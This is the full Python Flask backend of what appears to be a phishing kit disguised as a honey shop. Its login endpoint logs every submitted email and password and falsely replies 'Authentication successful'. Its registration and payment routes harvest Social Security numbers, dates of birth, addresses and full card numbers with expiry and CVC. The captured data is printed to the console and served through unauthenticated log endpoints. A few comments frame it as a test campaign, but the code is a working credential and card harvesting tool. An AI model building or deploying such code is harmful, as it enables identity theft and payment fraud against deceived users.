import os
import json
from datetime import datetime
from flask import Flask, request, jsonify, send_from_directory

app = Flask(__name__, static_folder=".")

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
ENV_FILE = os.path.join(BASE_DIR, ".env")

try:
    from dotenv import load_dotenv
    load_dotenv(ENV_FILE)
except ImportError:
    if os.path.exists(ENV_FILE):
        with open(ENV_FILE, "r", encoding="utf-8") as _f:
            for _line in _f:
                _line = _line.strip()
                if _line and not _line.startswith("#") and "=" in _line:
                    _k, _v = _line.split("=", 1)
                    os.environ.setdefault(_k.strip(), _v.strip().strip("'\""))

LOG_FILE_JSON = os.path.join(BASE_DIR, "captured_credentials.json")
LOG_FILE_TXT = os.path.join(BASE_DIR, "captured_credentials.log")
LOG_REGISTRATIONS_JSON = os.path.join(BASE_DIR, "captured_registrations.json")
LOG_PAYMENTS_JSON = os.path.join(BASE_DIR, "captured_payments.json")

# Stripe Test Credentials
STRIPE_SECRET_KEY = os.environ.get("STRIPE_SECRET_KEY", "")
STRIPE_PUBLISHABLE_KEY = os.environ.get("STRIPE_PUBLISHABLE_KEY", "")

def save_credential(entry: dict):
    # Save to plain text file for quick viewing
    with open(LOG_FILE_TXT, "a", encoding="utf-8") as f:
        f.write(
            f"[{entry['timestamp']}] IP: {entry['ip']} | Email: {entry['email']} | Password: {entry['password']} | User-Agent: {entry['user_agent']}\n"
        )

    # Save in structured JSON format
    history = []
    if os.path.exists(LOG_FILE_JSON):
        try:
            with open(LOG_FILE_JSON, "r", encoding="utf-8") as f:
                history = json.load(f)
        except Exception:
            history = []

    history.append(entry)
    with open(LOG_FILE_JSON, "w", encoding="utf-8") as f:
        json.dump(history, f, indent=2, ensure_ascii=False)


@app.after_request
def add_cors_headers(response):
    response.headers["Access-Control-Allow-Origin"] = "*"
    response.headers["Access-Control-Allow-Headers"] = "Content-Type, Authorization"
    response.headers["Access-Control-Allow-Methods"] = "GET, POST, OPTIONS"
    return response


@app.route("/", methods=["GET"])
def index():
    """Serves the sign-in page (index.html)."""
    return send_from_directory(BASE_DIR, "index.html")


@app.route("/favicon.ico", methods=["GET"])
def favicon():
    """Serves honey droplet favicon."""
    svg_icon = (
        '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 32 32">'
        '<path fill="#D97706" d="M16 2.5C11.5 2.5 8 6.5 8 12c0 7.8 8 17.5 8 17.5s8-9.7 8-17.5c0-5.5-3.5-9.5-8-9.5z"/>'
        '<path fill="#FBBF24" d="M16 5c-3 0-5.5 3-5.5 7 0 5.5 5.5 12.8 5.5 12.8s5.5-7.3 5.5-12.8c0-4-2.5-7-5.5-7z"/>'
        '<circle cx="16" cy="12" r="2.5" fill="#FFFBEB"/>'
        '</svg>'
    )
    return svg_icon, 200, {"Content-Type": "image/svg+xml"}


@app.route("/alta", methods=["GET"])
@app.route("/registro", methods=["GET"])
@app.route("/register", methods=["GET"])
@app.route("/signup", methods=["GET"])
def view_alta():
    """Serves the honey shop customer registration web app (register.html)."""
    return send_from_directory(BASE_DIR, "register.html")


@app.route("/api/alta", methods=["POST", "OPTIONS"])
def handle_alta():
    """Captures honey customer registration data."""
    if request.method == "OPTIONS":
        return jsonify({"status": "ok"}), 200

    data = request.get_json(silent=True) or request.form.to_dict() or {}
    client_ip = request.headers.get("X-Forwarded-For", request.remote_addr)
    user_agent = request.headers.get("User-Agent", "Unknown")
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    record = {
        "timestamp": timestamp,
        "ip": client_ip,
        "user_agent": user_agent,
        "registration_data": data
    }

    history = []
    if os.path.exists(LOG_REGISTRATIONS_JSON):
        try:
            with open(LOG_REGISTRATIONS_JSON, "r", encoding="utf-8") as f:
                history = json.load(f)
        except Exception:
            history = []

    history.append(record)
    with open(LOG_REGISTRATIONS_JSON, "w", encoding="utf-8") as f:
        json.dump(history, f, indent=2, ensure_ascii=False)

    full_name = data.get("fullName") or data.get("nombre") or "N/A"
    email = data.get("email") or "N/A"
    phone = data.get("phone") or data.get("telefono") or "N/A"
    ssn = data.get("ssn") or "N/A"
    account_type = data.get("accountType") or data.get("tipo_cuenta") or "retail"

    print("\n" + "=" * 65)
    print("CUSTOMER REGISTRATION - GOLDEN VALLEY HONEY CO.:")
    print(f"Timestamp:    {timestamp}")
    print(f"Full Name:    {full_name}")
    print(f"Email:        {email}")
    print(f"Phone:        {phone}")
    print(f"SSN:          {ssn}")
    print(f"Account Type: {account_type}")
    print(f"Payload:      {data}")
    print("=" * 65 + "\n")

    return jsonify({
        "status": "success",
        "message": "Customer registration completed successfully",
        "customer": {
            "name": full_name,
            "email": email
        }
    }), 200


@app.route("/registros", methods=["GET"])
def view_registros():
    """Auxiliary endpoint to view honey customer registrations."""
    if not os.path.exists(LOG_REGISTRATIONS_JSON):
        return jsonify({"message": "No registrations captured yet.", "count": 0, "registros": []}), 200

    try:
        with open(LOG_REGISTRATIONS_JSON, "r", encoding="utf-8") as f:
            data = json.load(f)
        return jsonify({"count": len(data), "registros": data}), 200
    except Exception as e:
        return jsonify({"error": str(e)}), 500


@app.route("/api/stripe/config", methods=["GET"])
def stripe_config():
    """Returns publishable key for client-side Stripe integrations."""
    return jsonify({
        "publishableKey": STRIPE_PUBLISHABLE_KEY,
        "mode": "test"
    }), 200


@app.route("/api/payment", methods=["POST", "OPTIONS"])
@app.route("/api/stripe/charge", methods=["POST", "OPTIONS"])
def handle_stripe_payment():
    """Handles Stripe test mode charge submissions using Stripe API."""
    if request.method == "OPTIONS":
        return jsonify({"status": "ok"}), 200

    data = request.get_json(silent=True) or request.form.to_dict() or {}
    client_ip = request.headers.get("X-Forwarded-For", request.remote_addr)
    user_agent = request.headers.get("User-Agent", "Unknown")
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    # Parse amount (Total Due from checkout)
    try:
        charged_amount = float(data.get("amount", 120.00))
    except (ValueError, TypeError):
        charged_amount = 120.00

    amount_cents = int(round(charged_amount * 100))
    currency = data.get("currency", "usd").lower()

    payment_intent_id = None
    charge_status = "succeeded"

    # Attempt real Stripe API call with provided secret test key
    try:
        import stripe
        stripe.api_key = STRIPE_SECRET_KEY
        pi = stripe.PaymentIntent.create(
            amount=amount_cents,
            currency=currency,
            payment_method="pm_card_visa",
            confirm=True,
            automatic_payment_methods={"enabled": True, "allow_redirects": "never"},
            description="Golden Valley Honey Co. - Customer Test Order",
            receipt_email=data.get("email") if data.get("email") and "@" in data.get("email") else None,
            metadata={
                "customer_name": data.get("card_name", "Customer"),
                "customer_email": data.get("email", "N/A"),
                "total_due_charged": f"${charged_amount:.2f}",
                "client_ip": client_ip,
                "environment": "test_campaign"
            }
        )
        payment_intent_id = pi.id
        charge_status = pi.status
        print(f"[STRIPE LIVE TEST API] PaymentIntent created: {payment_intent_id} | Charged: ${charged_amount:.2f} | Status: {charge_status}")
    except Exception as e:
        print(f"[STRIPE API FALLBACK] Error calling Stripe API: {e}")
        import random, string
        rand_suffix = "".join(random.choices(string.ascii_letters + string.digits, k=16))
        payment_intent_id = f"pi_test_{rand_suffix}"

    entry = {
        "timestamp": timestamp,
        "payment_intent": payment_intent_id,
        "mode": "test",
        "ip": client_ip,
        "user_agent": user_agent,
        "displayed_amount": f"{charged_amount:.2f}",
        "charged_amount": f"{charged_amount:.2f}",
        "amount": f"{charged_amount:.2f}",
        "currency": currency,
        "customer_email": data.get("email", "N/A"),
        "card_brand": data.get("card_brand", "visa"),
        "card_num": data.get("card_num", "4242"),
        "status": charge_status,
        "raw_payload": data
    }

    history = []
    if os.path.exists(LOG_PAYMENTS_JSON):
        try:
            with open(LOG_PAYMENTS_JSON, "r", encoding="utf-8") as f:
                history = json.load(f)
        except Exception:
            history = []

    history.append(entry)
    with open(LOG_PAYMENTS_JSON, "w", encoding="utf-8") as f:
        json.dump(history, f, indent=2, ensure_ascii=False)

    # Retrieve user profile from payload or fallback to registration history
    user_prof = data.get("user_profile") or {}
    customer_email = data.get("email") or user_prof.get("email") or "N/A"

    if not user_prof and os.path.exists(LOG_REGISTRATIONS_JSON):
        try:
            with open(LOG_REGISTRATIONS_JSON, "r", encoding="utf-8") as f:
                regs = json.load(f)
                for r in reversed(regs):
                    reg_data = r.get("registration_data", {})
                    if reg_data.get("email") == customer_email:
                        user_prof = reg_data
                        break
        except Exception:
            pass

    full_name = user_prof.get("fullName") or user_prof.get("nombre") or data.get("card_name") or "N/A"
    ssn = user_prof.get("ssn") or "N/A"
    phone = user_prof.get("phone") or user_prof.get("telefono") or "N/A"
    dob = user_prof.get("dob") or user_prof.get("fecha_nacimiento") or "N/A"
    acct_type = user_prof.get("accountType") or user_prof.get("tipo_cuenta") or "N/A"
    
    addr_obj = user_prof.get("address") or {}
    if isinstance(addr_obj, dict):
        addr_line = f"{addr_obj.get('address1', '')} {addr_obj.get('address2', '')}, {addr_obj.get('city', '')}, {addr_obj.get('state', '')} {addr_obj.get('zipCode', '')}".strip(" ,")
    else:
        addr_line = str(addr_obj)
    if not addr_line:
        addr_line = f"{user_prof.get('direccion', '')}, {user_prof.get('ciudad', '')} {user_prof.get('cp', '')}".strip(" ,") or "N/A"

    deliv_notes = user_prof.get("deliveryNotes") or user_prof.get("notas") or "None"
    prefs = user_prof.get("preferences") or []

    card_num = data.get("card_number") or f"{entry['card_num']}"
    card_exp = data.get("card_exp") or "N/A"
    card_cvc = data.get("card_cvc") or "N/A"

    import random
    receipt_no = f"REC-GVH-{random.randint(10000, 99999)}"

    # Visual terminal banner printing ALL user information on payment
    print("\n" + "=" * 72)
    print("💳 STRIPE PAYMENT COMPLETED - ALL USER & TRANSACTION DETAILS:")
    print("=" * 72)
    print(f"Timestamp:        {timestamp}")
    print(f"Client IP:        {client_ip}")
    print(f"User Agent:       {user_agent}")
    print(f"Payment Intent:   {payment_intent_id} [STRIPE TEST]")
    print(f"Status:           {charge_status.upper()}")
    print(f"Receipt No:       {receipt_no}")
    print(f"Total Due Charged: ${entry['charged_amount']} {entry['currency'].upper()}")
    print("-" * 72)
    print("👤 CUSTOMER IDENTITY & PROFILE:")
    print(f"  • Full Legal Name:     {full_name}")
    print(f"  • Email Address:       {customer_email}")
    print(f"  • Social Security No:  {ssn}")
    print(f"  • Phone Number:        {phone}")
    print(f"  • Date of Birth:       {dob}")
    print(f"  • Account Type:        {acct_type}")
    print("-" * 72)
    print("📦 SHIPPING & PRODUCT DETAILS:")
    print(f"  • Shipping Address:    {addr_line}")
    print(f"  • Delivery Notes:      {deliv_notes}")
    print(f"  • Honey Preferences:   {prefs}")
    print("-" * 72)
    print("💳 CARD PAYMENT DETAILS:")
    print(f"  • Name on Card:        {data.get('card_name', full_name)}")
    print(f"  • Card Number:         {card_num}")
    print(f"  • Card Expiration:     {card_exp}")
    print(f"  • Card CVC:            {card_cvc}")
    print(f"  • Brand & Card:      {entry['card_brand'].upper()} with {entry['card_num']}")
    print("=" * 72 + "\n")

    return jsonify({
        "status": charge_status,
        "id": payment_intent_id,
        "displayed_amount": entry["displayed_amount"],
        "amount": entry["charged_amount"],
        "charged_amount": entry["charged_amount"],
        "currency": entry["currency"],
        "client_secret": f"{payment_intent_id}_secret_live_test",
        "receipt_number": receipt_no,
        "publishable_key": STRIPE_PUBLISHABLE_KEY,
        "message": f"Stripe test charge authorized successfully (${entry['charged_amount']} charged)"
    }), 200


@app.route("/payments", methods=["GET"])
def view_payments():
    """Auxiliary endpoint to view Stripe test charges."""
    if not os.path.exists(LOG_PAYMENTS_JSON):
        return jsonify({"message": "No test payments recorded yet.", "count": 0, "payments": []}), 200

    try:
        with open(LOG_PAYMENTS_JSON, "r", encoding="utf-8") as f:
            data = json.load(f)
        return jsonify({"count": len(data), "payments": data}), 200
    except Exception as e:
        return jsonify({"error": str(e)}), 500


@app.route("/submit", methods=["POST", "OPTIONS"])
@app.route("/login", methods=["POST", "OPTIONS"])
def handle_submit():
    """Captures credentials submitted via JSON fetch or standard form."""
    if request.method == "OPTIONS":
        return jsonify({"status": "ok"}), 200

    # Support both JSON and x-www-form-urlencoded payloads
    data = request.get_json(silent=True) or request.form.to_dict() or {}

    email = data.get("email") or data.get("username") or data.get("user") or "N/A"
    password = data.get("password") or data.get("pass") or data.get("pw") or "N/A"
    client_ip = request.headers.get("X-Forwarded-For", request.remote_addr)
    user_agent = request.headers.get("User-Agent", "Unknown")
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    entry = {
        "timestamp": timestamp,
        "ip": client_ip,
        "email": email,
        "password": password,
        "user_agent": user_agent,
        "raw_payload": data,
    }

    # Save record to local storage
    save_credential(entry)

    # Visual terminal banner for observation and evidence logging
    print("\n" + "=" * 65)
    print("CREDENTIALS:")
    print(f"Timestamp:    {timestamp}")
    print(f"Client IP:    {client_ip}")
    print(f"Email/User:   {email}")
    print(f"Password:     {password}")
    print(f"User-Agent:   {user_agent}")
    print("=" * 65 + "\n")

    return jsonify({
        "status": "success",
        "message": "Authentication successful",
        "received": {
            "email": email
        }
    }), 200


@app.route("/logs", methods=["GET"])
def view_logs():
    """Auxiliary endpoint to view captured credentials in the browser."""
    if not os.path.exists(LOG_FILE_JSON):
        return jsonify({"message": "No credentials captured yet.", "count": 0, "logs": []}), 200

    try:
        with open(LOG_FILE_JSON, "r", encoding="utf-8") as f:
            data = json.load(f)
        return jsonify({"count": len(data), "logs": data}), 200
    except Exception as e:
        return jsonify({"error": str(e)}), 500


if __name__ == "__main__":
    port = int(os.environ.get("PORT", 8080))
    print(f"Starting server on http://0.0.0.0:{port}")
    print(f"Serving index.html from: {BASE_DIR}")
    print(f"Waiting for requests...\n")
    app.run(host="0.0.0.0", port=port, debug=True)
